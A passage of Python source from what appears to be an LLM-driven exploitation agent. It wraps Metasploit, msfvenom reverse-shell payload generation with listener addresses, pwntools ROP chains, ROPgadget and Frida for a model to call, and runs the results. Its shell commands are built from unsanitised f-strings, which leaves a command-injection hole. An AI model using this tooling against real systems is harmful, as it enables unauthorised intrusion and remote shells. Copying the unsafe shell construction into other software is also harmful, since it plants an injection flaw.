        if exploit_data.get("exploitation_strategy", {}).get("goal") == "code_execution":
            exploit_type = "rce"
        elif "rop" in code.lower() or "gadget" in code.lower():
            exploit_type = "rop_chain"
        elif "reverse_shell" in code.lower() or "shell" in code.lower():
            exploit_type = "reverse_shell"

        notes = []
        if exploit_data.get("failure_analysis"):
            notes.append(f"Refinement: {exploit_data['failure_analysis'].get('root_cause', '')}")
        if not successful and tested:
            notes.append(f"Testing output: {test_output[:200]}")

        return Exploit(
            vulnerability_id=vulnerability.id,
            exploit_type=exploit_type,
            language=language,
            code=code,
            description=description,
            file_path=None,  # Will be set when saved
            tested=tested,
            successful=successful,
            test_output=test_output[:500] if test_output else None,
            notes="\n".join(notes) if notes else None,
        )

    async def _save_exploits(self, exploits: list[Exploit]) -> None:
        """Save generated exploits to files.

        Args:
            exploits: List of exploits to save.
        """
        from mrzero.core.config import get_config

        config = get_config()
        output_dir = config.output_dir / "exploits"
        output_dir.mkdir(parents=True, exist_ok=True)

        for exploit in exploits:
            # Determine file extension
            ext_map = {
                "python": ".py",
                "c": ".c",
                "solidity": ".sol",
                "javascript": ".js",
            }
            ext = ext_map.get(exploit.language, ".txt")

            # Generate filename
            filename = f"exploit_{exploit.vulnerability_id}{ext}"
            exploit_file = output_dir / filename

            # Write exploit code
            exploit_file.write_text(exploit.code)
            exploit.file_path = str(exploit_file)

            # Also write a companion info file
            info_file = output_dir / f"exploit_{exploit.vulnerability_id}_info.md"
            info_content = f"""# Exploit Information

**Vulnerability ID:** {exploit.vulnerability_id}
**Exploit Type:** {exploit.exploit_type}
**Language:** {exploit.language}
**Tested:** {"Yes" if exploit.tested else "No"}
**Successful:** {"Yes" if exploit.successful else "No"}

## Description

{exploit.description or "No description available."}

## Notes

{exploit.notes or "No notes."}

## Test Output

```
{exploit.test_output or "No test output."}
```
"""
            info_file.write_text(info_content)

    async def _run_command(self, command: str, timeout: int = 60) -> dict[str, Any]:
        """Run a shell command.

        Args:
            command: Command to run.
            timeout: Timeout in seconds.

        Returns:
            Result dict with output, error, returncode.
        """
        try:
            proc = await asyncio.create_subprocess_shell(
                command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )

            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)

            return {
                "success": proc.returncode == 0,
                "output": stdout.decode("utf-8", errors="ignore"),
                "error": stderr.decode("utf-8", errors="ignore"),
                "returncode": proc.returncode,
                "timeout": False,
            }

        except asyncio.TimeoutError:
            return {
                "success": False,
                "output": "",
                "error": f"Command timed out after {timeout}s",
                "returncode": -1,
                "timeout": True,
            }
        except Exception as e:
            return {
                "success": False,
                "output": "",
                "error": str(e),
                "returncode": -1,
                "timeout": False,
            }

    def _parse_llm_json_response(self, response: str) -> dict[str, Any] | None:
        """Parse LLM's JSON response.

        Args:
            response: Raw LLM response.

        Returns:
            Parsed JSON dict or None.
        """
        try:
            # Try to find JSON in ```json ... ``` blocks
            json_block_match = re.search(r"```json\s*([\s\S]*?)\s*```", response)
            if json_block_match:
                return json.loads(json_block_match.group(1))

            # Try to find raw JSON object
            json_match = re.search(r"\{[\s\S]*\}", response)
            if json_match:
                return json.loads(json_match.group())

            return None

        except json.JSONDecodeError:
            return None

    # =========================================================================
    # MCP Tool Execution Methods
    # =========================================================================

    async def _run_mcp_tool(
        self,
        server_name: str,
        operation: str,
        **kwargs: Any,
    ) -> dict[str, Any]:
        """Run a tool via MCP server.

        This is a generic method for calling any MCP-connected tool.
        The LLM decides which tools to use and with what parameters.

        Args:
            server_name: Name of the MCP server (e.g., "pwndbg", "metasploit").
            operation: Operation to perform.
            **kwargs: Tool-specific arguments.

        Returns:
            Result dict with output or error.
        """
        try:
            tools_service = await self._get_tools_service()

            # Route to appropriate tool execution method based on category
            if server_name in ["pwndbg", "windbg"]:
                result = await tools_service.run_debugger(
                    server_name, kwargs.get("target", ""), operation, **kwargs
                )
            elif server_name == "metasploit":
                result = await tools_service.run_exploitation(server_name, operation, **kwargs)
            elif server_name in ["ghidra", "ida-pro", "binary-ninja"]:
                result = await tools_service.run_binary_analysis(
                    server_name, kwargs.get("binary_path", ""), operation, **kwargs
                )
            else:
                # Generic MCP call
                from mrzero.core.mcp.client import get_mcp_manager

                mcp_manager = get_mcp_manager()
                connection = mcp_manager.get_connection(server_name)

                if connection is None or not connection.connected:
                    return {
                        "success": False,
                        "error": f"MCP server '{server_name}' not connected",
                        "hint": f"Run 'mrzero mcp install {server_name}' first",
                    }

                output = await connection.call_tool(operation, kwargs)
                return {"success": True, "output": output}

            return {
                "success": result.success,
                "output": result.output,
                "error": result.error,
                "execution_time": result.execution_time,
            }

        except Exception as e:
            return {"success": False, "error": str(e)}

    async def _run_pwndbg(
        self,
        command: str,
        target: str | None = None,
        pid: int | None = None,
    ) -> dict[str, Any]:
        """Run a pwndbg/GDB command via MCP.

        Use this for debugging binaries, analyzing crashes, and exploit development.

        Args:
            command: GDB/pwndbg command to execute (e.g., "vmmap", "heap", "x/20gx $rsp").
            target: Binary path to debug (for new sessions).
            pid: Process ID to attach to (alternative to target).

        Returns:
            Result dict with command output.

        Example commands:
            - "vmmap" - View memory mappings
            - "heap" - Analyze heap state
            - "bins" - Show heap bins
            - "telescope $rsp 20" - Examine stack
            - "rop --grep 'pop rdi'" - Find ROP gadgets
            - "checksec" - Check binary protections
            - "x/20i $pc" - Disassemble at PC
        """
        kwargs: dict[str, Any] = {"command": command}
        if target:
            kwargs["target"] = target
        if pid:
            kwargs["pid"] = pid

        return await self._run_mcp_tool("pwndbg", "execute", **kwargs)

    async def _run_metasploit(
        self,
        operation: str,
        module: str | None = None,
        options: dict[str, Any] | None = None,
    ) -> dict[str, Any]:
        """Run Metasploit Framework commands via MCP.

        Use this for exploit modules, payload generation, and post-exploitation.

        Args:
            operation: Operation to perform:
                - "search": Search for modules
                - "use": Select a module
                - "set": Set module options
                - "exploit": Run the exploit
                - "generate": Generate payload
            module: Module path (e.g., "exploit/multi/handler").
            options: Module options (e.g., {"LHOST": "10.0.0.1", "LPORT": "4444"}).

        Returns:
            Result dict with operation output.

        Examples:
            - Search: operation="search", module="type:exploit platform:linux"
            - Use: operation="use", module="exploit/unix/ftp/vsftpd_234_backdoor"
            - Set: operation="set", options={"RHOSTS": "target", "RPORT": "21"}
            - Exploit: operation="exploit"
        """
        kwargs: dict[str, Any] = {}
        if module:
            kwargs["module"] = module
        if options:
            kwargs["options"] = options

        return await self._run_mcp_tool("metasploit", operation, **kwargs)

    async def _run_ghidra(
        self,
        operation: str,
        binary_path: str,
        **kwargs: Any,
    ) -> dict[str, Any]:
        """Run Ghidra binary analysis via MCP.

        Use this for reverse engineering, decompilation, and function analysis.

        Args:
            operation: Operation to perform:
                - "analyze": Full binary analysis
                - "decompile": Decompile a function
                - "disassemble": Disassemble at address
                - "functions": List all functions
                - "xrefs": Get cross-references
                - "strings": Extract strings
            binary_path: Path to the binary file.
            **kwargs: Additional options (e.g., address, function_name).

        Returns:
            Result dict with analysis output.
        """
        return await self._run_mcp_tool("ghidra", operation, binary_path=binary_path, **kwargs)

    async def _run_frida_mcp(
        self,
        operation: str,
        target: str,
        script: str | None = None,
        **kwargs: Any,
    ) -> dict[str, Any]:
        """Run Frida dynamic instrumentation via MCP.

        Use this for runtime hooking, bypassing checks, and memory manipulation.

        Args:
            operation: Operation to perform:
                - "attach": Attach to process
                - "spawn": Spawn and attach
                - "inject": Inject Frida script
                - "enumerate": List modules/exports
            target: Target process name, PID, or app identifier.
            script: Frida JavaScript code to inject.
            **kwargs: Additional options.

        Returns:
            Result dict with Frida output.
        """
        frida_kwargs: dict[str, Any] = {"target": target}
        if script:
            frida_kwargs["script"] = script
        frida_kwargs.update(kwargs)

        return await self._run_mcp_tool("frida", operation, **frida_kwargs)

    # =========================================================================
    # Local Tool Execution Methods
    # =========================================================================

    async def _run_ropgadget(
        self,
        binary_path: str | Path,
        options: list[str] | None = None,
    ) -> dict[str, Any]:
        """Find ROP gadgets in a binary using ROPgadget.

        Args:
            binary_path: Path to the binary file.
            options: Additional ROPgadget options:
                - ["--ropchain"] - Generate ROP chain
                - ["--only", "pop|ret"] - Filter gadgets
                - ["--depth", "5"] - Search depth
                - ["--badbytes", "00 0a"] - Exclude bad bytes

        Returns:
            Result dict with gadgets found.

        Example:
            gadgets = await self._run_ropgadget("/path/to/binary", ["--ropchain"])
        """
        if not self._available_tools.get("ropgadget"):
            return {
                "success": False,
                "error": "ROPgadget not installed",
                "hint": "Install with: pip install ROPgadget",
            }

        cmd = f"ROPgadget --binary {binary_path}"
        if options:
            cmd += " " + " ".join(options)

        result = await self._run_command(cmd, timeout=120)

        # Parse gadgets from output
        if result["success"]:
            gadgets = []
            for line in result["output"].split("\n"):
                line = line.strip()
                if " : " in line and "0x" in line:
                    parts = line.split(" : ", 1)
                    if len(parts) == 2:
                        gadgets.append(
                            {
                                "address": parts[0].strip(),
                                "instructions": parts[1].strip(),
                            }
                        )
            result["gadgets"] = gadgets
            result["gadget_count"] = len(gadgets)

        return result

    async def _run_frida_local(
        self,
        target: str,
        script_content: str | None = None,
        script_file: str | Path | None = None,
        trace_pattern: str | None = None,
        spawn: bool = False,
    ) -> dict[str, Any]:
        """Run Frida for dynamic instrumentation locally.

        Args:
            target: Target process name, PID, or binary path.
            script_content: Frida JavaScript code to inject.
            script_file: Path to Frida script file.
            trace_pattern: Pattern for frida-trace (e.g., "open*").
            spawn: Whether to spawn the process.

        Returns:
            Result dict with Frida output.

        Example:
            # Hook with script
            result = await self._run_frida_local(
                "target_app",
                script_content='Interceptor.attach(...)'
            )

            # Trace function calls
            result = await self._run_frida_local(
                "./binary",
                trace_pattern="recv*",
                spawn=True
            )
        """
        if not self._available_tools.get("frida"):
            return {
                "success": False,
                "error": "Frida not installed",
                "hint": "Install with: pip install frida-tools",
            }

        if trace_pattern:
            # Use frida-trace
            cmd = f"frida-trace -i '{trace_pattern}'"
            if spawn:
                cmd += f" -f {target}"
            else:
                cmd += f" {target}"
        else:
            # Use frida with script
            cmd = "frida"
            if spawn:
                cmd += f" -f {target}"
            else:
                cmd += f" -n {target}"

            if script_file:
                cmd += f" -l {script_file}"
            elif script_content:
                # Write script to temp file
                with tempfile.NamedTemporaryFile(mode="w", suffix=".js", delete=False) as f:
                    f.write(script_content)
                    script_file = f.name
                cmd += f" -l {script_file}"

        return await self._run_command(cmd, timeout=60)

    async def _generate_payload(
        self,
        payload_type: str,
        lhost: str | None = None,
        lport: int | None = None,
        output_format: str = "python",
        platform: str = "linux",
        arch: str = "x64",
        encoder: str | None = None,
        iterations: int = 1,
        bad_chars: str | None = None,
    ) -> dict[str, Any]:
        """Generate shellcode/payload using msfvenom.

        Args:
            payload_type: Payload type (e.g., "shell_reverse_tcp", "meterpreter/reverse_tcp").
            lhost: Listener IP address.
            lport: Listener port.
            output_format: Output format (python, c, raw, elf, exe, etc.).
            platform: Target platform (linux, windows, osx).
            arch: Architecture (x86, x64, arm).
            encoder: Encoder to use (e.g., "x86/shikata_ga_nai").
            iterations: Encoding iterations.
            bad_chars: Bad characters to avoid (e.g., "\\x00\\x0a\\x0d").

        Returns:
            Result dict with generated payload.

        Example:
            payload = await self._generate_payload(
                "shell_reverse_tcp",
                lhost="10.10.10.10",
                lport=4444,
                output_format="python",
                bad_chars="\\x00"
            )
        """
        msfvenom_path = shutil.which("msfvenom")
        if not msfvenom_path:
            return {
                "success": False,
                "error": "msfvenom not installed",
                "hint": "Install Metasploit Framework",
            }

        # Build payload name
        payload_name = f"{platform}/{arch}/{payload_type}"

        # Build command
        cmd = f"msfvenom -p {payload_name}"

        if lhost:
            cmd += f" LHOST={lhost}"
        if lport:
            cmd += f" LPORT={lport}"

        cmd += f" -f {output_format}"

        if encoder:
            cmd += f" -e {encoder} -i {iterations}"
        if bad_chars:
            cmd += f" -b '{bad_chars}'"

        result = await self._run_command(cmd, timeout=60)

        if result["success"]:
            result["payload_type"] = payload_type
            result["format"] = output_format
            result["payload"] = result["output"]

        return result

    async def _run_checksec(self, binary_path: str | Path) -> dict[str, Any]:
        """Check binary security mitigations.

        Args:
            binary_path: Path to the binary.

        Returns:
            Result dict with security features (RELRO, Stack Canary, NX, PIE, etc.).
        """
        # Try checksec command first
        if self._available_tools.get("checksec"):
            result = await self._run_command(f"checksec --file={binary_path}", timeout=30)
            if result["success"]:
                # Parse checksec output
                protections = self._parse_checksec_output(result["output"])
                result["protections"] = protections
                return result

        # Fallback to pwntools checksec
        if self._available_tools.get("pwntools"):
            try:
                from pwn import ELF

                elf = ELF(str(binary_path), checksec=False)
                protections = {
                    "RELRO": elf.relro if hasattr(elf, "relro") else "Unknown",
                    "Stack Canary": elf.canary if hasattr(elf, "canary") else False,
                    "NX": elf.nx if hasattr(elf, "nx") else False,
                    "PIE": elf.pie if hasattr(elf, "pie") else False,
                    "FORTIFY": False,  # Not easily detected
                    "arch": elf.arch,
                    "bits": elf.bits,
                }
                return {"success": True, "protections": protections}
            except Exception as e:
                return {"success": False, "error": str(e)}

        return {
            "success": False,
            "error": "Neither checksec nor pwntools available",
        }

    def _parse_checksec_output(self, output: str) -> dict[str, Any]:
        """Parse checksec command output.

        Args:
            output: Raw checksec output.

        Returns:
            Dict with parsed protections.
        """
        protections = {}
        for line in output.split("\n"):
            line = line.strip()
            # Parse typical checksec output format
            if "RELRO" in line:
                if "Full RELRO" in line:
                    protections["RELRO"] = "Full"
                elif "Partial RELRO" in line:
                    protections["RELRO"] = "Partial"
                else:
                    protections["RELRO"] = "None"
            if "Stack" in line or "Canary" in line:
                protections["Stack Canary"] = "Canary found" in line or "Yes" in line
            if "NX" in line:
                protections["NX"] = "NX enabled" in line or "Yes" in line
            if "PIE" in line:
                protections["PIE"] = "PIE enabled" in line or "Yes" in line
            if "FORTIFY" in line:
                protections["FORTIFY"] = "Yes" in line

        return protections

    async def _run_pwntools_script(self, script: str, timeout: int = 60) -> dict[str, Any]:
        """Execute a pwntools script.

        This allows the LLM to generate and run pwntools-based exploit code
        for testing payloads, building ROP chains, etc.

        Args:
            script: Python script using pwntools.
            timeout: Execution timeout.

        Returns:
            Result dict with script output.

        Example script:
            from pwn import *
            context.arch = 'amd64'
            payload = flat([
                b'A' * 72,
                p64(0x401234),  # pop rdi; ret
                p64(0x404000),  # /bin/sh address
                p64(0x401100),  # system@plt
            ])
            print(payload.hex())
        """
        if not self._available_tools.get("pwntools"):
            return {
                "success": False,
                "error": "pwntools not installed",
                "hint": "Install with: pip install pwntools",
            }

        # Write script to temp file
        with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
            f.write(script)
            script_file = f.name

        try:
            result = await self._run_command(f"python3 {script_file}", timeout=timeout)
            return result
        finally:
            Path(script_file).unlink(missing_ok=True)

    # =========================================================================
    # Tool Availability Summary for LLM
    # =========================================================================

    def get_tool_summary(self) -> str:
        """Get a summary of available tools for the LLM.

        Returns:
            Formatted string describing available tools.
        """
        summary_parts = ["## Available Exploitation Tools\n"]

        # MCP Tools
        mcp_tools = []
        try:
            from mrzero.core.mcp.registry import get_mcp_registry

            registry = get_mcp_registry()
            for name in ["pwndbg", "metasploit", "ghidra", "frida"]:
                if registry.get_server(name):
                    mcp_tools.append(name)
        except ImportError:
            pass

        if mcp_tools:
            summary_parts.append("### MCP Tools (Remote via MCP Protocol)")
            for tool in mcp_tools:
                if tool == "pwndbg":
                    summary_parts.append(
                        f"- **{tool}**: GDB with pwndbg - Use `_run_pwndbg(command)` for debugging"
                    )
                elif tool == "metasploit":
                    summary_parts.append(
                        f"- **{tool}**: Metasploit Framework - Use `_run_metasploit(operation, module, options)`"
                    )
                elif tool == "ghidra":
                    summary_parts.append(
                        f"- **{tool}**: Binary analysis - Use `_run_ghidra(operation, binary_path)`"
                    )
                elif tool == "frida":
                    summary_parts.append(
                        f"- **{tool}**: Dynamic instrumentation - Use `_run_frida_mcp(operation, target)`"
                    )
            summary_parts.append("")

        # Local Tools
        local_tools = []
        tool_info = {
            "pwntools": ("Python exploit library", "_run_pwntools_script(script)"),
            "ropgadget": ("ROP gadget finder", "_run_ropgadget(binary_path, options)"),
            "frida": ("Dynamic instrumentation", "_run_frida_local(target, script)"),
            "checksec": ("Binary security checker", "_run_checksec(binary_path)"),
            "gdb": ("GNU Debugger", "_run_command('gdb ...')"),
        }

        for tool, available in self._available_tools.items():
            if available and tool in tool_info:
                local_tools.append((tool, *tool_info[tool]))

        if local_tools:
            summary_parts.append("### Local Tools (Direct Execution)")
            for tool, desc, method in local_tools:
                summary_parts.append(f"- **{tool}**: {desc} - Use `{method}`")
            summary_parts.append("")

        # msfvenom
        if shutil.which("msfvenom"):
            summary_parts.append("### Payload Generation")
            summary_parts.append(
                "- **msfvenom**: Use `_generate_payload(payload_type, lhost, lport, format)`"
            )
            summary_parts.append("")

        return "\n".join(summary_parts)
